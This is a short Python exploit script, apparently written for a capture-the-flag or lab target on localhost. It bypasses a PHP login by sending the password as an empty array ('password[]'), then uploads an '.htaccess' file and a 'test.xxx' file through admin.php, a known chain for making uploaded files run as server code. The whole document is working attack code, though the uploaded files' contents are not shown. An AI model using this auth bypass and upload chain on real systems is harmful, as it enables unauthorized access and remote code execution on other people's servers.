import requests 

URL = "http://localhost:4444" 

s = requests.Session() 

r = s.post(
    f"{URL}/login.php",
    data={ 
        "username": "peppy", 
        "password[]": ""
    }
)
print(r.status_code)
print(r.cookies)

r = s.post(
    f"{URL}/admin.php",
    files={
        "file": open(".htaccess")
    }
)
print(r.status_code)

r = s.post(
    f"{URL}/admin.php",
    files={
        "file": open("test.xxx")
    }
)
print(r.status_code)